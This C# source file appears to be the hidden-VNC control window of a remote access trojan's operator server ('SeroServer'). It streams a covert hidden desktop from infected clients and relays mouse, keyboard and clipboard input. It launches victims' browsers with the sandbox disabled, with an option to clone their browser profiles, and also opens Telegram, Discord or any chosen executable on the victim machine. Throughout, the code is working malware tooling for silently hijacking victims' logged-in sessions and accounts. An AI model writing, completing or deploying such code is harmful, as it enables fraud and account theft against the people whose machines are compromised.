using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using DevExpress.Xpf.Core;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class HvncWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private string _clientId;
    private readonly string _hwid;
    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
    private int _reconnectCountdown;
    private bool _wasStreaming;
    private volatile bool _closed, _streaming;
    private int _frameCount;
    private DateTime _fpsTime = DateTime.UtcNow;
    private long _lastMoveMs;
    private bool _ctrlDown;

    // Canvas dimensions reported by last frame
    private int _remoteW = 1280;
    private int _remoteH = 720;

    private static readonly HashSet<string> _browserLabels = new(StringComparer.OrdinalIgnoreCase)
        { "Chrome", "Edge", "Firefox", "Brave", "Vivaldi", "Opera", "Opera GX" };

    // App entries: (label shown in ComboBox, command line sent to stub — env vars expanded there)
    private static readonly (string Label, string Cmd)[] AppEntries =
    [
        ("Explorer",  "explorer.exe"),
        ("Chrome",    @"%ProgramFiles%\Google\Chrome\Application\chrome.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=""%TEMP%\hvnc_chrome"""),
        ("Edge",      @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=""%TEMP%\hvnc_edge"""),
        ("Firefox",   @"%ProgramFiles%\Mozilla Firefox\firefox.exe -profile ""%TEMP%\hvnc_ff"" -no-remote -width 1280 -height 720"),
        ("Brave",     @"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=""%TEMP%\hvnc_brave"""),
        ("Vivaldi",   @"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized"),
        ("Opera",     @"%LOCALAPPDATA%\Programs\Opera\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --no-first-run --user-data-dir=""%TEMP%\hvnc_opera"""),
        ("Opera GX",  @"%LOCALAPPDATA%\Programs\Opera GX\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --no-first-run --user-data-dir=""%TEMP%\hvnc_operagx"""),
        ("AyuGram",   @"%APPDATA%\AyuGram Desktop\AyuGram.exe"),
        ("Telegram",  @"%APPDATA%\Telegram Desktop\Telegram.exe"),
        ("Discord",   @"%LOCALAPPDATA%\Discord\Update.exe --processStart Discord.exe"),
    ];

    public HvncWindow(TlsServer server, string clientId)
    {
        _server   = server;
        _clientId = clientId;
        _hwid     = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
        InitializeComponent();
        WindowResizer.Enable(this);

        TxtClientId.Text = $"[ {clientId} ]";

        SldQuality.ValueChanged += (_, e) => TxtQuality.Text = $"{(int)e.NewValue}";
        SldFps.ValueChanged     += (_, e) => TxtFpsVal.Text  = $"{(int)e.NewValue}";

        _server.RegisterHandler(clientId, PacketType.HvncFrame,
            pkt => OnHvncFrame(clientId, pkt.Data));
        _server.RegisterHandler(clientId, PacketType.HvncProgress,
            pkt => OnHvncProgress(pkt.Data));
        _server.ClientDisconnected += OnClientDisconnected;
        _server.ClientConnected += OnClientConnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _closed = true;
            _reconnectTimer?.Stop();
            _clipTimer?.Stop(); _clipTimer = null;
            _server.UnregisterHandler(_clientId, PacketType.HvncFrame);
            _server.UnregisterHandler(_clientId, PacketType.HvncProgress);
            _server.ClientDisconnected -= OnClientDisconnected;
            _server.ClientConnected -= OnClientConnected;
            if (_streaming) SendStop();
            Lang.LanguageChanged -= ApplyLanguage;
        };


        foreach (var (label, _) in AppEntries)
            CmbApp.Items.Add(label);
        CmbApp.SelectedIndex = 0;
        CmbApp.SelectionChanged += (_, _) => UpdateCloneProfileVisibility();
        UpdateCloneProfileVisibility();

        Opacity = 0;
        Loaded += (_, _) => BeginAnimation(OpacityProperty,
            new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)));
    }

    private void ApplyLanguage() { this.Title = Lang.Get("FEAT_HVNC"); if (TxtStatus != null && !_streaming) TxtStatus.Text = Lang.Get("STOPPED"); }

    // ── Streaming state ───────────────────────────────────────────────────────

    private void SetStreamingState(bool streaming)
    {
        _streaming = streaming;
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled   = !streaming;
            BtnStart.Opacity     = streaming ? 0.35 : 1.0;
            BtnStop.IsEnabled    = streaming;
            BtnStop.Opacity      = streaming ? 1.0 : 0.35;
            SldQuality.IsEnabled = !streaming;
            SldFps.IsEnabled     = !streaming;
            TxtStatus.Text       = streaming ? Lang.Get("HVNC_STREAMING") : Lang.Get("STOPPED");
            LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
            TxtPlaceholder.Visibility = streaming ? Visibility.Collapsed : Visibility.Visible;
            if (!streaming) TxtFps.Text = "";
            if (streaming) ImgFrame.Focus(); // keyboard ready immediately without needing a click
        });
    }

    // ── Outgoing ──────────────────────────────────────────────────────────────

    private void SendStart()
    {
        var data = new HvncStartData
        {
            Quality      = (int)SldQuality.Value,
            Fps          = (int)SldFps.Value,
            Width        = 1280,
            Height       = 720,
            CloneBrowser = ChkCloneProfile.IsChecked == true
        };
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncStart,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
        });
        SetStreamingState(true);

        // If clipboard sync is off, immediately clear the hidden-desktop clipboard so
        // HVNC apps cannot access the operator's clipboard via right-click → Paste.
        if (ChkClipboard.IsChecked != true)
            SendClipboardClear();

        ServerWindow.ReportGlobalActivity("HVNC started", _clientId, "running");
        ServerWindow.LogGlobal($"[HVNC] HVNC stream started on client {_clientId}.");
    }

    private void SendClipboardClear()
    {
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncClipboard,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncClipboardData { Text = "" })
        });
    }

    private void SendStop()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncStop, Data = "{}" });
        SetStreamingState(false);
        ServerWindow.ReportGlobalActivity("HVNC stopped", _clientId, "complete");
        ServerWindow.LogGlobal($"[HVNC] HVNC stream stopped on client {_clientId}.");
    }

    private void SendAck()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncFrameAck });
    }

    private void SendInput(HvncInputData inp)
    {
        if (!_streaming) return;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncInput,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(inp)
        });
    }

    private void SendExec(string path, bool cloneBrowser)
    {
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncExec,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncExecData { Path = path, CloneBrowser = cloneBrowser })
        });
    }

    // ── Clipboard sync toggle (same pill LED as mouse/keyboard) ──────────────
    private System.Windows.Threading.DispatcherTimer? _clipTimer;
    private string _lastClip = "";

    private void ChkClipboard_Checked(object s, RoutedEventArgs e)
    {
        _lastClip  = "";
        _clipTimer = new System.Windows.Threading.DispatcherTimer
            { Interval = TimeSpan.FromMilliseconds(1000) };
        _clipTimer.Tick += ClipSync_Tick;
        _clipTimer.Start();
    }

    private void ChkClipboard_Unchecked(object s, RoutedEventArgs e)
    {
        _clipTimer?.Stop();
        _clipTimer = null;
        _lastClip  = "";
        // Clear hidden-desktop clipboard so right-click paste can no longer leak operator content
        if (_streaming) SendClipboardClear();
    }

    private void ClipSync_Tick(object? sender, EventArgs e)
    {
        if (_closed) { _clipTimer?.Stop(); return; }
        string text;
        try { text = System.Windows.Clipboard.GetText(); }
        catch { return; }
        if (string.IsNullOrEmpty(text) || text == _lastClip) return;
        _lastClip = text;

        // Push new clipboard content to the hidden desktop
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncClipboard,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncClipboardData { Text = text })
        });
    }

    // ── Incoming ──────────────────────────────────────────────────────────────

    private void OnHvncFrame(string clientId, string json)
    {
        if (_closed || clientId != _clientId) return;
        try
        {
            var frame = Newtonsoft.Json.JsonConvert.DeserializeObject<HvncFrameData>(json);
            if (frame == null || string.IsNullOrEmpty(frame.J)) { SendAck(); return; }

            _remoteW = frame.W > 0 ? frame.W : _remoteW;
            _remoteH = frame.H > 0 ? frame.H : _remoteH;

            Task.Run(() =>
            {
                try
                {
                    var bytes = Convert.FromBase64String(frame.J);
                    using var ms = new MemoryStream(bytes);
                    var bi = new BitmapImage();
                    bi.BeginInit();
                    bi.StreamSource = ms;
                    bi.CacheOption = BitmapCacheOption.OnLoad;
                    bi.EndInit();
                    bi.Freeze();
                    if (!_closed)
                        Dispatcher.BeginInvoke(() => ShowFrame(bi));
                }
                catch { SendAck(); }
            });
        }
        catch { SendAck(); }
    }

    private void OnHvncProgress(string json)
    {
        if (_closed) return;
        try
        {
            var p = Newtonsoft.Json.JsonConvert.DeserializeObject<HvncProgressData>(json);
            if (p == null) return;
            bool done = p.Pct >= 100;
            Dispatcher.BeginInvoke(() =>
            {
                ProfileProgressBar.Value  = p.Pct;
                ProfileProgressPct.Text   = $"{p.Pct}%";
                ProfileProgressLabel.Text = string.IsNullOrEmpty(p.Label) ? Lang.Get("HVNC_CLONING") : p.Label;
                // Only manipulate overlay/button if it was already visible (clone was requested this launch).
                // A stale progress packet from a previous session cannot lock BtnLaunch.
                if (ProfileProgressOverlay.Visibility == Visibility.Visible)
                {
                    ProfileProgressOverlay.Visibility = done ? Visibility.Collapsed : Visibility.Visible;
                    BtnLaunch.IsEnabled = done;
                    BtnLaunch.Opacity   = done ? 1.0 : 0.38;
                }
            });
        }
        catch { }
    }

    private void ShowFrame(BitmapImage bi)
    {
        if (_closed) return;
        ImgFrame.Source = bi;
        TxtPlaceholder.Visibility = Visibility.Collapsed;

        _frameCount++;
        var now = DateTime.UtcNow;
        if ((now - _fpsTime).TotalSeconds >= 1)
        {
            TxtFps.Text        = $"{_frameCount} fps";
            TxtResolution.Text = $"{_remoteW}×{_remoteH}";
            _frameCount = 0;
            _fpsTime = now;
        }
        SendAck();
    }

    // ── Input mapping ─────────────────────────────────────────────────────────

    private (int rx, int ry) ToRemote(Point local)
    {
        double sx = _remoteW / Math.Max(1, ImgFrame.ActualWidth);
        double sy = _remoteH / Math.Max(1, ImgFrame.ActualHeight);
        return ((int)(local.X * sx), (int)(local.Y * sy));
    }

    private void ImgFrame_MouseMove(object s, MouseEventArgs e)
    {
        if (ChkMouse.IsChecked != true) return;
        long now = Environment.TickCount64;
        if (now - _lastMoveMs < 8) return; // cap at ~125 Hz to avoid flooding stub input queue
        _lastMoveMs = now;
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        SendInput(new HvncInputData { T = "mm", X = rx, Y = ry });
    }

    private void ImgFrame_MouseDown(object s, MouseButtonEventArgs e)
    {
        ImgFrame.Focus();
        ImgFrame.CaptureMouse();
        if (ChkMouse.IsChecked != true) return;
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        SendInput(new HvncInputData { T = "mc", X = rx, Y = ry, Button = btn, Down = true });
        e.Handled = true;
    }

    private void ImgFrame_MouseUp(object s, MouseButtonEventArgs e)
    {
        ImgFrame.ReleaseMouseCapture();
        if (ChkMouse.IsChecked != true) return;
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        SendInput(new HvncInputData { T = "mc", X = rx, Y = ry, Button = btn, Down = false });
        e.Handled = true;
    }

    private void ImgFrame_MouseWheel(object s, MouseWheelEventArgs e)
    {
        if (ChkMouse.IsChecked != true) return;
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        SendInput(new HvncInputData { T = "mw", X = rx, Y = ry, WheelDelta = e.Delta });
    }

    private void ImgFrame_KeyDown(object s, KeyEventArgs e)
    {
        if (ChkKeyboard.IsChecked != true) return;
        var key = e.Key == Key.System ? e.SystemKey : e.Key;
        int vk = KeyInterop.VirtualKeyFromKey(key);
        if (vk == 0) return;

        if (key == Key.LeftCtrl || key == Key.RightCtrl) _ctrlDown = true;

        // Block Ctrl+C/V/X when clipboard sync is off — the hidden desktop shares the
        // same window station so clipboard is accessible without the button; blocking
        // these shortcuts prevents unintended clipboard interaction.
        if (_ctrlDown && ChkClipboard.IsChecked != true &&
            key is Key.C or Key.V or Key.X)
        {
            e.Handled = true;
            return;
        }

        SendInput(new HvncInputData { T = "kd", VK = vk });
        e.Handled = true;
    }

    private void ImgFrame_KeyUp(object s, KeyEventArgs e)
    {
        if (ChkKeyboard.IsChecked != true) return;
        var key = e.Key == Key.System ? e.SystemKey : e.Key;
        int vk = KeyInterop.VirtualKeyFromKey(key);
        if (vk == 0) return;

        if (key == Key.LeftCtrl || key == Key.RightCtrl) _ctrlDown = false;

        SendInput(new HvncInputData { T = "ku", VK = vk });
        e.Handled = true;
    }

    // ── UI handlers ───────────────────────────────────────────────────────────

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            _wasStreaming = _streaming;
            if (_streaming) SetStreamingState(false);
            _reconnectCountdown = 60;
            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
            ReconnectOverlay.Visibility = Visibility.Visible;
            ServerWindow.ReportGlobalActivity("⚡ Connection lost", _clientId, "failed");

            _reconnectTimer?.Stop();
            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
            _reconnectTimer.Tick += (_, _) =>
            {
                _reconnectCountdown--;
                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
                if (_reconnectCountdown <= 0)
                {
                    _reconnectTimer.Stop();
                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", _hwid.Length > 8 ? _hwid[..8] : _hwid, "failed");
                    Close();
                }
            };
            _reconnectTimer.Start();
        });
    }

    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
    {
        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
        Dispatcher.BeginInvoke(() =>
        {
            if (_closed) return;
            var oldId = _clientId;
            _clientId = c.Id;

            // Re-register per-client packet handlers on the new client ID
            _server.UnregisterHandler(oldId, PacketType.HvncFrame);
            _server.UnregisterHandler(oldId, PacketType.HvncProgress);
            _server.RegisterHandler(_clientId, PacketType.HvncFrame,
                pkt => OnHvncFrame(_clientId, pkt.Data));
            _server.RegisterHandler(_clientId, PacketType.HvncProgress,
                pkt => OnHvncProgress(pkt.Data));

            // Hide overlays, cancel timer
            _reconnectTimer?.Stop();
            ReconnectOverlay.Visibility     = Visibility.Collapsed;
            ProfileProgressOverlay.Visibility = Visibility.Collapsed;
            BtnLaunch.IsEnabled = true;
            BtnLaunch.Opacity   = 1.0;

            // Update UI
            TxtClientId.Text = $"[ {_clientId} ]";
            ServerWindow.ReportGlobalActivity("✓ Reconnected (HVNC)", _clientId, "complete");

            // Auto-resume streaming if it was active before disconnect
            if (_wasStreaming)
            {
                _wasStreaming = false;
                SendStart();
            }
        });
    }

    private void UpdateCloneProfileVisibility()
    {
        int idx = CmbApp.SelectedIndex;
        bool isBrowser = idx >= 0 && idx < AppEntries.Length && _browserLabels.Contains(AppEntries[idx].Label);
        ChkCloneProfile.Visibility = isBrowser ? Visibility.Visible : Visibility.Collapsed;
        if (!isBrowser) ChkCloneProfile.IsChecked = false;
    }

    private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
    private void BtnStop_Click(object s, RoutedEventArgs e)
    {
        SendStop();
        _wasStreaming = false;  // Prevent auto-resume on reconnect if user explicitly stops
    }
    private void Close_Click(object s, RoutedEventArgs e)    => Close();

    private void BtnMenu_Click(object sender, RoutedEventArgs e)
    {
        if (sender is System.Windows.Controls.Button btn)
        {
            var mainWindow = Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
            if (mainWindow == null) return;
            var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "HvncWindow");
            btn.ContextMenu = menu;
            menu.PlacementTarget = btn;
            menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
            menu.IsOpen = true;
        }
    }

    // ── App launcher ──────────────────────────────────────────────────────────

    private void BtnLaunch_Click(object s, RoutedEventArgs e)
    {
        // Guard: block while clone is in progress
        if (ProfileProgressOverlay.Visibility == Visibility.Visible) return;
        int idx = CmbApp.SelectedIndex;
        if (idx < 0 || idx >= AppEntries.Length) return;

        bool wantsClone = ChkCloneProfile.IsChecked == true;
        if (wantsClone)
        {
            ProfileProgressBar.Value  = 0;
            ProfileProgressPct.Text   = "0%";
            ProfileProgressLabel.Text = Lang.Get("HVNC_CLONING");
            ProfileProgressOverlay.Visibility = Visibility.Visible;
            BtnLaunch.IsEnabled = false;
            BtnLaunch.Opacity   = 0.38;
        }

        SendExec(AppEntries[idx].Cmd, wantsClone);
    }

    private void BtnCustomPath_Click(object s, RoutedEventArgs e)
    {
        var res = System.Windows.Application.Current.Resources;
        var bgBrush     = res["WindowBgBrush"]      as System.Windows.Media.Brush ?? System.Windows.Media.Brushes.Black;
        var fgBrush     = res["ContentTextBrush"]   as System.Windows.Media.Brush ?? System.Windows.Media.Brushes.White;
        var labelBrush  = res["FieldLabelBrush"]    as System.Windows.Media.Brush ?? System.Windows.Media.Brushes.Gray;
        var inputBg     = res["InputBgBrush"]        as System.Windows.Media.Brush ?? System.Windows.Media.Brushes.DarkBlue;
        var inputBorder = res["InputBorderBrush"]    as System.Windows.Media.Brush ?? System.Windows.Media.Brushes.Gray;

        var win = new Window
        {
            Title = Lang.Get("HVNC_CUSTOM_PATH_TITLE"),
            Width = 500, Height = 148,
            WindowStyle = WindowStyle.ToolWindow,
            ResizeMode = ResizeMode.NoResize,
            WindowStartupLocation = WindowStartupLocation.CenterOwner,
            Owner = this,
            Background = bgBrush
        };

        var stack = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };

        var hint = new System.Windows.Controls.TextBlock
        {
            Text = Lang.Get("HVNC_CUSTOM_PATH_HINT"),
            Foreground = labelBrush,
            FontSize = 10, Margin = new Thickness(0, 0, 0, 4)
        };

        var tb = new System.Windows.Controls.TextBox
        {
            Background  = inputBg,
            Foreground  = fgBrush,
            BorderBrush = inputBorder,
            CaretBrush  = fgBrush,
            FontSize = 11, Height = 26, Margin = new Thickness(0, 0, 0, 8),
            Padding = new Thickness(6, 0, 6, 0)
        };
        tb.KeyDown += (_, ke) =>
        {
            if (ke.Key == System.Windows.Input.Key.Return) { win.DialogResult = true; win.Close(); }
            if (ke.Key == System.Windows.Input.Key.Escape) { win.Close(); }
        };

        var btn = new System.Windows.Controls.Button
        {
            Content = Lang.Get("ACT_LAUNCH"), Height = 28,
            Background  = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromArgb(80, 0x22, 0xC5, 0x5E)),
            Foreground  = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E)),
            BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E)),
            FontWeight  = System.Windows.FontWeights.SemiBold, FontSize = 11
        };
        btn.Click += (_, _) => { win.DialogResult = true; win.Close(); };

        stack.Children.Add(hint);
        stack.Children.Add(tb);
        stack.Children.Add(btn);
        win.Content = stack;
        win.Loaded += (_, _) => tb.Focus();

        if (win.ShowDialog() == true && !string.IsNullOrWhiteSpace(tb.Text))
            SendExec(tb.Text.Trim(), ChkCloneProfile.IsChecked == true);
    }

}
